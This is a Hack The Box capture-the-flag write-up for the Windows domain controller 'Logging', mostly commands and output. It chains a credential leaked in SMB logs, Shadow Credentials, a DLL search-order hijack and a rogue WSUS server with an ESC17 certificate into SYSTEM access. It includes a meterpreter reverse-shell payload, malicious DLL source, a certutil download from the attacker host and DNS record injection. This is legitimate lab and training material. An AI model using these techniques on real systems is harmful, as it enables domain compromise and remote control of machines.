# HTB Write-Up: Logging

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Logging) |
| Difficulty | Medium |
| OS | Windows |
| Date | October 23, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — SMB Logs Share & Leaked Service Credentials](#enumeration-smb-logs-share-leaked-service-credentials)
3. [Initial Access — Protected Users Bypass via Kerberos Pre-Auth](#initial-access-protected-users-bypass-via-kerberos-pre-auth)
4. [Lateral Movement — Shadow Credentials on msa\_health$](#lateral-movement-shadow-credentials-on-msa_health)
5. [Privilege Escalation — Scheduled Task Abuse & DLL Search-Order Hijack](#privilege-escalation-scheduled-task-abuse-dll-search-order-hijack)
6. [Privilege Escalation — WSUS ESC17 Certificate Abuse to SYSTEM](#privilege-escalation-wsus-esc17-certificate-abuse-to-system)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.245.130 --ulimit=5000
```

**Notable Open Ports:**

| Port | Service |
| --- | --- |
| 53 | DNS |
| 88 | Kerberos |
| 389 / 636 | LDAP / LDAPS |
| 445 | SMB |
| 5985 | WinRM |
| 8530 / 8531 | WSUS (HTTP/HTTPS) |
| 9389 | .NET Message Framing |

This is a Domain Controller for a domain matching the lab description. Alongside the usual AD ports, **8530/8531** stand out — the default ports for **WSUS** (Windows Server Update Services) — which turns out to matter a great deal later in this chain.

## Enumeration — SMB Logs Share & Leaked Service Credentials

### 2.1 — Accessing the Logs Share

Credentials given in the lab description (`wallace.everette:Welcome2026@`) were used to connect to a `Logs` SMB share:

```bash
smbclient //10.129.245.130/Logs --user='wallace.everette' --password='Welcome2026@'
```

Four log files were present and pulled down:

```
smb: \> prompt
smb: \> mget *
```

```
Audit_Heartbeat.log
IdentitySync_Trace_20260219.log
Service_State.log
TaskMonitor.log
```

### 2.2 — Finding a Leaked Credential

Reading through the logs, `IdentitySync_Trace_20260219.log` contained a verbose connection dump from a failed LDAP bind attempt — including the bind credentials in plaintext:

```
[2026-02-09 03:00:02.215] INFO  - Establishing SQL session with HR01.logging.htb...
[2026-02-09 03:00:03.055] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-02-09 03:00:03.125] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
[2026-02-19 03:00:03.510] WARN  - Connectivity failed for logging\svc_recovery. Checking alternate Domain Controller...
```

A development/integration process was logging its own bind credentials on failure — leaking **`svc_recovery:Em3rg3ncyPa$$2025`**.

The domain and hosts were added locally for name resolution:

```bash
echo "10.129.245.130 logging.htb hr01.logging.htb dc01.logging.htb" | sudo tee -a /etc/hosts
```

## Initial Access — Protected Users Bypass via Kerberos Pre-Auth

### 3.1 — A Misleading Failure

The leaked `svc_recovery` credentials were tried against SMB and WinRM:

```bash
netexec smb 10.129.245.130 -u svc_recovery -p 'Em3rg3ncyPa$$2025'
netexec winrm 10.129.245.130 -u svc_recovery -p 'Em3rg3ncyPa$$2025'
```

Both returned:

```
[-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

This is not the same as `STATUS_LOGON_FAILURE` (wrong password) — **`STATUS_ACCOUNT_RESTRICTION`** means the credentials themselves were never evaluated; a policy is blocking the authentication method before that point. BloodHound data (collected after syncing the clock) confirmed the cause: `svc_recovery` is a member of the **Protected Users** group, which forbids NTLM authentication entirely and permits only Kerberos. That's exactly why the NTLM-based SMB/WinRM checks were rejected outright.

```bash
sudo ntpdate 10.129.245.130
bloodhound-python -d logging.htb -u 'wallace.everette' -p 'Welcome2026@' -dc dc01.logging.htb -ns 10.129.245.130 -c All --zip
```

The same BloodHound pull also showed `svc_recovery` holding **GenericWrite** over an object named `MSA_HEALTH$` — the next step once a usable credential form was in hand.

### 3.2 — Requesting a TGT

Since only Kerberos works for this account, a TGT was requested directly:

```bash
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2025'
```

```
Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

This error does mean the password itself was rejected. The leaked password followed a recognizable pattern — `Em3rg3ncyPa$${year}` — and had been captured from a log dated **2026-02-09**, while the password rotation note implied a yearly cycle. Trying the current year instead of the logged one worked:

```bash
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
```

```
[*] Saving ticket in svc_recovery.ccache
```

```bash
export KRB5CCNAME=svc_recovery.ccache
klist
```

```
Default principal: svc_recovery@LOGGING.HTB
Service principal: krbtgt/LOGGING.HTB@LOGGING.HTB
```

## Lateral Movement — Shadow Credentials on msa\_health$

With a valid TGT and **GenericWrite** over `msa_health$`, a **Shadow Credentials** attack was the natural move: GenericWrite is enough to write a `msDS-KeyCredentialLink` attribute onto the target object, registering an attacker-controlled public key as a valid certificate-based logon method for it — yielding the account's NT hash without ever touching its password.

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials msa_health$
```

**Output:**

```
[+] KeyCredential generated with following sha256 of RSA key: f5affd...
[+] TGT stored in ccache file msa_health_MJ.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

The recovered hash was used directly for a **Pass-the-Hash** shell:

```bash
evil-winrm -i logging.htb -u msa_health$ -H 603fc24ee01a9409f83c9d1d701485c5
```

## Privilege Escalation — Scheduled Task Abuse & DLL Search-Order Hijack

### 5.1 — A Clue in the User's Documents

As `msa_health$`, a script in the Documents folder pointed to a scheduled task:

```powershell
*Evil-WinRM* PS C:\Users\msa_health$\Documents> type monitor.ps1
```

The script monitors the health of a task named **"UpdateChecker Agent"** and logs its state to `C:\Share\Logs\TaskMonitor.log`.

### 5.2 — Enumerating the Task via COM

Standard enumeration tools were blocked:

```powershell
schtasks /query /fo LIST /v /tn "UpdateChecker Agent"
# Access is denied
Get-ScheduledTask -TaskName "UpdateChecker Agent"
# Cannot connect to CIM server. Access denied
```

The Task Scheduler **COM interface** doesn't go through CIM/WMI, so it bypassed the permission restriction:

```powershell
$TaskName = "UpdateChecker Agent"
$service = New-Object -ComObject "Schedule.Service"
$service.Connect()
$task = $service.GetFolder("\").GetTask($TaskName)
$task
```

The XML definition revealed the key details: the task runs every **3 minutes** (`PT3M`), its `Principal` runs as the SID of user **`jaylee.clifton`** (despite the `Author` field showing Administrator), and its action executes:

```
C:\Program Files\UpdateMonitor\UpdateMonitor.exe 500 /scan=3 /autofix=true
```

### 5.3 — Finding a Writable Weak Point

The binary itself was locked down:

```powershell
icacls "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
# logging\IT:(I)(F)   NT AUTHORITY\SYSTEM:(I)(F)   BUILTIN\Administrators:(I)(F)
```

(`jaylee.clifton` is a member of the `IT` group — worth remembering, since it comes up again later.) But `C:\ProgramData` — the standard, lightly-protected directory Windows apps use for config, cache, and logs — held a matching `UpdateMonitor` folder:

```powershell
icacls c:\programdata\updatemonitor
# BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
```

`WD` (write data) for `BUILTIN\Users` meant this folder was writable. Its `Logs\monitor.log` showed the application's actual startup behavior:

```
[2026-04-16 16:41:18] Checking for update on local server...
[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
```

Error 126 is "module not found" — the application looks for `Settings_Update.zip` in the writable ProgramData folder and expects it to contain `settings_update.dll`, which doesn't currently exist. This is a classic **DLL search-order hijack**: drop a malicious DLL where the trusted-but-missing one is expected, and the SYSTEM-scheduled task context (running as `jaylee.clifton`, part of `IT`) will load and execute it.

### 5.4 — Building the Malicious DLL

A reverse shell payload was generated:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f exe -o rev.exe
```

A DLL was written exporting the function the application calls, which drops and runs the payload:

```c
#include <windows.h>
#include <stdlib.h>

void LaunchPayload() {
    system("cmd /c c:\\programdata\\updatemonitor\\rev.exe");
}

__declspec(dllexport) void PreUpdateCheck() {
    LaunchPayload();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
```

```bash
i686-w64-mingw32-gcc -shared -O2 -o settings_update.dll poc.c -Wl,--subsystem,windows
zip Settings_Update.zip settings_update.dll
```

### 5.5 — Delivery & Shell

Both files were uploaded to the writable ProgramData path:

```powershell
*Evil-WinRM* PS C:\programdata\updatemonitor> upload Settings_Update.zip
*Evil-WinRM* PS C:\programdata\updatemonitor> upload rev.exe
```

A handler was started to catch the callback once the task's next 3-minute cycle ran:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.25
set LPORT 4444
run
```

```
[*] Meterpreter session 1 opened (10.10.14.25:4444 -> 10.129.245.130:57813)
meterpreter > getuid
Server username: logging\jaylee.clifton
```

The user flag was retrieved:

```
meterpreter > shell
C:\Users\jaylee.clifton\Desktop>type user.txt
94f97701d598f4732aa2fdfdfe29aa17
```

## Privilege Escalation — WSUS ESC17 Certificate Abuse to SYSTEM

### 6.1 — A Note Pointing to WSUS

Further enumeration as `jaylee.clifton` turned up a saved support-ticket export referencing a `ForceSync` scheduled task and a staging update server at **`wsus.logging.htb`**, with a note that its DNS record was never actually created:

```
C:\Users\jaylee.clifton\Documents\Tickets>type Incident_4922_WSUS_Remediation_ViewExport.html
```

> "...I've pointed this box to the staging endpoint at wsus.logging.htb... DNS is still not updated... Task is running on a 120s loop... Do not touch the trigger settings."

```powershell
nslookup wsus.logging.htb
# *** localhost can't find wsus.logging.htb: Non-existent domain
```

**WSUS** (Windows Server Update Service) centralizes patching across a domain's machines. If the DNS name the domain's machines use to find their WSUS server doesn't exist yet, and an attacker can create it, that attacker can stand in as the update server itself.

### 6.2 — Confirming the WSUS Policy

The active WSUS configuration was read directly from the registry, via the `jaylee.clifton` meterpreter session:

```
meterpreter > reg enumkey -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
meterpreter > reg queryval -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate -v WUServer
```

```
Data: https://wsus.logging.htb:8531
```

Confirmed — and critically, it's **HTTPS**, so simply redirecting the DNS name wouldn't be enough; any rogue server needs a certificate the client will trust.

### 6.3 — Redirecting DNS

A malicious `A` record for the missing hostname was created using `dnstool.py` from **krbrelayx**, pointing it at the attacker's host:

```bash
python3 dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 10.129.245.130 -a add -r wsus.logging.htb -d 10.10.14.25
```

```
[+] LDAP operation completed successfully
```

A listener on 8531 confirmed the DC was now resolving `wsus.logging.htb` to the attacker and attempting a TLS handshake:

```bash
nc -nvlp 8531
```

As expected, the traffic was encrypted — a trusted certificate was still needed to actually intercept it.

### 6.4 — Finding ESC17

The certificate requirement pointed toward AD CS misconfigurations. A TGT for `jaylee.clifton` was extracted on the target with **Rubeus** and moved to Kali for the rest of the attack:

```powershell
certutil.exe -urlcache -f http://10.10.14.25/Rubeus.exe Rubeus.exe
.\Rubeus.exe tgtdeleg /nowrap
```

```bash
echo 'doIFyDCCBcS...IVEI=' | base64 -d > jaylee.ticket
impacket-ticketConverter jaylee.ticket jaylee.ccache
export KRB5CCNAME=jaylee.ccache
```

**Certipy** was used to check for vulnerable certificate templates:

```bash
certipy find -vulnerable -stdout -u 'jaylee.clifton@logging.htb' -k -dc-host DC01.logging.htb
```

A template named **`UpdateSrv`** came back flagged:

```
[!] Vulnerabilities
  ESC17                             : Enrollee supplies subject and template allows server authentication.
[*] Remarks
      Enrollment Rights               : LOGGING.HTB\IT
```

**ESC17** means the template lets the requester specify their own subject name (including arbitrary DNS SANs) while still issuing a certificate valid for **Server Authentication** — effectively letting any enrollable principal mint a trusted TLS certificate for any hostname they choose. `jaylee.clifton`, as a member of **IT**, has enrollment rights on it.

### 6.5 — Requesting a Certificate for wsus.logging.htb

```bash
certipy req -u 'jaylee.clifton@logging.htb' -k -target DC01.logging.htb -template UpdateSrv -ca logging-DC01-CA -dns wsus.logging.htb
```

```
[+] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Wrote certificate and private key to 'wsus.pfx'
```

The `.pfx` (Windows/ADCS format, bundled and password-protected) was converted to `.pem` (plain-text cert + key) for use by the Linux-based rogue WSUS tool:

```bash
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

### 6.6 — Rogue WSUS Server via wsuks

With a DNS name pointing at the attacker and a trusted certificate for that exact name, **wsuks** was used to stand up a malicious WSUS server and push a command as a fake update, abusing the trust chain the real WSUS client expects:

```bash
sudo wsuks -t 10.129.245.130 -I tun0 --serve-only --WSUS-Server dc01.logging.htb --tls-cert wsus.pem -c '/accepteula /s cmd.exe "/c c:\\programdata\\updatemonitor\\rev.exe"'
```

A handler caught the callback — this time as **SYSTEM**, since Windows Update runs with full system privileges:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.25
set LPORT 4444
run
```

```
[*] Meterpreter session 2 opened (10.10.14.25:4444 -> 10.129.245.130:61495)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 6.7 — Root Flag

```
meterpreter > shell
C:\Users\toby.brynleigh\Desktop>type root.txt
77438bec4362b0ad578167e69fd79439
```
